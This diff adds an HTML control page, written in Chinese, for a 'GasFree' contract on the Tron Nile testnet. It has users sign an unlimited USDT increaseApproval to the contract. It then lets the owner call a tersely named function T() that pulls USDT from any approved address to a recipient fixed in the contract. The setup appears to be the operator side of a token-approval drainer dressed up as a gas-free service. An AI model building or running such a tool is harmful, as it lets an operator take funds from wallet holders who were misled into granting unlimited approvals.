@@ -1,0 +1,230 @@
+<!doctype html>
+<html lang="zh">
+<head>
+<meta charset="utf-8" />
+<title>GasFree 触发器 - Nile 测试网</title>
+<style>
+  body { font: 14px/1.5 -apple-system, "Segoe UI", sans-serif; max-width: 760px; margin: 24px auto; padding: 0 16px; color: #222; }
+  h1 { font-size: 18px; margin: 0 0 8px; }
+  .sub { color: #888; font-size: 12px; margin-bottom: 16px; }
+  fieldset { border: 1px solid #ddd; border-radius: 6px; padding: 12px 16px; margin: 12px 0; }
+  legend { font-weight: 600; padding: 0 6px; }
+  label { display: block; margin: 6px 0 2px; font-size: 12px; color: #555; }
+  input, select, button { font: inherit; padding: 6px 8px; border: 1px solid #bbb; border-radius: 4px; box-sizing: border-box; width: 100%; }
+  button { background: #1a73e8; color: #fff; border: none; cursor: pointer; margin-top: 8px; }
+  button:hover { background: #1557b0; }
+  button:disabled { background: #aaa; cursor: not-allowed; }
+  pre { background: #f6f8fa; border: 1px solid #e1e4e8; border-radius: 4px; padding: 8px; overflow: auto; font-size: 12px; white-space: pre-wrap; word-break: break-all; }
+  .row { display: flex; gap: 8px; }
+  .row > * { flex: 1; }
+  .ok  { color: #137333; }
+  .err { color: #c5221f; }
+  small { color: #888; }
+  #debug { background: #fffbe6; border-color: #f0c36d; min-height: 32px; }
+</style>
+</head>
+<body>
+<h1>GasFree 触发器 - Nile</h1>
+<div class="sub">所有异常都会显示在这里 + 浏览器 F12 Console 也会有日志</div>
+
+<!-- 调试面板,实时显示状态 -->
+<fieldset>
+  <legend>🪛 调试面板</legend>
+  <pre id="debug">等待启动...</pre>
+</fieldset>
+
+<fieldset>
+  <legend>1. 连接钱包</legend>
+  <button id="btnConnect">连接 TronLink</button>
+  <div id="addr" style="margin-top:8px"><small>未连接</small></div>
+</fieldset>
+
+<fieldset>
+  <legend>2. 合约地址</legend>
+  <label>GasFree 合约地址 (部署后填这里)</label>
+  <input id="contractAddr" placeholder="T..." />
+</fieldset>
+
+<fieldset>
+  <legend>3A. 一键授权 USDT (increaseApproval,累加式不会清零)</legend>
+  <small>用户在 <b>自己的</b> 钱包里执行。Tron 链 USDT 专属累加式授权。</small>
+  <label>USDT 合约地址</label>
+  <input id="approveTokenUSDT" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" />
+  <label>增加额度 (uint256 最大,前面要加 0x)</label>
+  <input id="approveAmountUSDT" value="0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" />
+  <button id="btnApproveUSDT">🚀 执行 increaseApproval</button>
+  <pre id="approveLogUSDT">等待操作</pre>
+</fieldset>
+
+<fieldset>
+  <legend>3B. Owner 触发 T() (transferUSDT)</legend>
+  <small>从已授权的用户地址转出,目标地址在合约里已锁定。函数名在压缩版里叫 T。</small>
+  <div class="row">
+    <div>
+      <label>金额 (整数,USDT=6位小数 → 1 个 = 1000000)</label>
+      <input id="amount" placeholder="1000000" />
+    </div>
+  </div>
+  <label>用户地址 (钱从这个地址出)</label>
+  <input id="fromAddr" placeholder="T..." />
+  <button id="btnTransfer">触发 transferUSDT</button>
+  <pre id="transferLog">等待操作</pre>
+</fieldset>
+
+<script>
+// ==========================================================================
+// 调试助手:把每一步写到 #debug,并打到 console
+// ==========================================================================
+const dbg = document.getElementById("debug");
+function log(msg, type = "info") {
+  const line = `[${new Date().toLocaleTimeString()}] ${msg}`;
+  console.log(line);
+  dbg.textContent += (dbg.textContent === "等待启动..." ? "" : "\n") + line;
+  if (type === "err") dbg.style.background = "#ffe6e6";
+}
+
+// 捕获所有未处理错误
+window.addEventListener("error", e => {
+  log("❌ 全局错误: " + e.message + " @ " + e.filename + ":" + e.lineno, "err");
+});
+window.addEventListener("unhandledrejection", e => {
+  log("❌ Promise 未捕获: " + (e.reason && e.reason.message || e.reason), "err");
+});
+
+log("页面 JS 开始执行");
+
+// ==========================================================================
+// TronLink 工具
+// ==========================================================================
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+async function getTronWeb(timeoutMs = 8000) {
+  log("等待 TronLink 注入...");
+  const start = Date.now();
+  while (Date.now() - start < timeoutMs) {
+    if (window.tronLink && window.tronLink.tronWeb) {
+      log("✅ TronLink 已就绪");
+      return window.tronLink.tronWeb;
+    }
+    if (window.tronWeb) {
+      log("✅ 检测到 window.tronWeb");
+      return window.tronWeb;
+    }
+    await sleep(150);
+  }
+  throw new Error("超时未检测到 TronLink。请确认:\n1. 已安装 TronLink Chrome 扩展\n2. 已解锁并切到 Nile 测试网\n3. 页面不是 file:// 协议(用 http://localhost)");
+}
+
+// ==========================================================================
+// ABI 片段
+// ==========================================================================
+const ABI_TRANSFER = [
+  {
+    "constant": false, "inputs": [
+      { "name": "f", "type": "address" },
+      { "name": "a", "type": "uint256" }
+    ],
+    "name": "T", "outputs": [{ "name": "", "type": "bool" }],
+    "payable": false, "stateMutability": "nonpayable", "type": "function"
+  }
+];
+
+const ABI_APPROVE = [
+  {
+    "constant": false, "inputs": [
+      { "name": "_spender",     "type": "address" },
+      { "name": "_addedValue",  "type": "uint256" }
+    ],
+    "name": "increaseApproval", "outputs": [{ "name": "success", "type": "bool" }],
+    "payable": false, "stateMutability": "nonpayable", "type": "function"
+  }
+];
+
+// ==========================================================================
+// 1. 连接钱包
+// ==========================================================================
+let userAddr = null;
+
+const btnConnect = document.getElementById("btnConnect");
+log("绑定连接按钮 click 事件...");
+btnConnect.addEventListener("click", async () => {
+  log("👉 你点了连接按钮");
+  const addrDiv = document.getElementById("addr");
+  addrDiv.innerHTML = "<small>连接中...</small>";
+  try {
+    const tw = await getTronWeb();
+    log("调用 tron_requestAccounts...");
+    const res = await tw.request({ method: "tron_requestAccounts" });
+    log("返回: " + JSON.stringify(res));
+    userAddr = tw.defaultAddress.base58;
+    if (!userAddr) throw new Error("钱包未授权或未选择账户");
+    addrDiv.innerHTML = `<span class="ok">已连接: ${userAddr}</span>`;
+    log("✅ 连接成功,地址=" + userAddr, "info");
+  } catch (e) {
+    addrDiv.innerHTML = `<span class="err">连接失败: ${e.message || e}</span>`;
+    log("❌ 连接失败: " + (e.stack || e.message || e), "err");
+  }
+});
+log("连接按钮绑定完成");
+
+// ==========================================================================
+// 3A. 用户 approve
+// ==========================================================================
+// USDT: increaseApproval (Tron 链 USDT 老版命名)
+document.getElementById("btnApproveUSDT").addEventListener("click", async () => {
+  const logEl = document.getElementById("approveLogUSDT");
+  logEl.innerHTML = "处理中...";
+  try {
+    const tw = await getTronWeb();
+    if (!userAddr) userAddr = tw.defaultAddress.base58;
+
+    const token = document.getElementById("approveTokenUSDT").value.trim();
+    const amount = document.getElementById("approveAmountUSDT").value.trim();
+    const contract = document.getElementById("contractAddr").value.trim();
+    if (!token || !amount || !contract) throw new Error("请把 USDT 地址、额度、GasFree 合约地址都填好");
+
+    log("USDT → 调用 increaseApproval: token=" + token + " spender=" + contract + " addedValue=" + amount);
+    const c = tw.contract(ABI_APPROVE, token);
+    const tx = await c.increaseApproval(contract, amount).send({
+      feeLimit: 100_000_000, callValue: 0, shouldPollResponse: true
+    });
+    logEl.innerHTML = `<span class="ok">USDT increaseApproval 成功 ✅ (授权额度增加 ${amount},不会清零)</span>\n${JSON.stringify(tx, null, 2)}`;
+    log("✅ USDT increaseApproval 成功");
+  } catch (e) {
+    logEl.innerHTML = `<span class="err">USDT increaseApproval 失败: ${e.message || e}</span>`;
+    log("❌ USDT increaseApproval 失败: " + (e.message || e), "err");
+  }
+});
+
+// ==========================================================================
+// 3B. Owner 触发 transfer
+// ==========================================================================
+document.getElementById("btnTransfer").addEventListener("click", async () => {
+  const logEl = document.getElementById("transferLog");
+  logEl.innerHTML = "处理中...";
+  try {
+    const tw = await getTronWeb();
+    if (!userAddr) userAddr = tw.defaultAddress.base58;
+
+    const contract = document.getElementById("contractAddr").value.trim();
+    const from = document.getElementById("fromAddr").value.trim();
+    const amount = document.getElementById("amount").value.trim();
+    if (!contract || !from || !amount) throw new Error("请把 GasFree 合约地址、用户地址、金额都填好");
+
+    log("调用 T() (transferUSDT): from=" + from + " amount=" + amount);
+    const c = tw.contract(ABI_TRANSFER, contract);
+    const tx = await c.T(from, amount).send({
+      feeLimit: 200_000_000, callValue: 0, shouldPollResponse: true
+    });
+    logEl.innerHTML = `<span class="ok">T() 成功 ✅ (${amount} USDT 从 ${from} 转给 RECIPIENT)</span>\n${JSON.stringify(tx, null, 2)}`;
+    log("✅ T() 成功");
+  } catch (e) {
+    logEl.innerHTML = `<span class="err">T() 失败: ${e.message || e}</span>`;
+    log("❌ T() 失败: " + (e.message || e), "err");
+  }
+});
+
+log("页面 JS 初始化完成,可以点击连接按钮");
+</script>
+</body>
+</html>
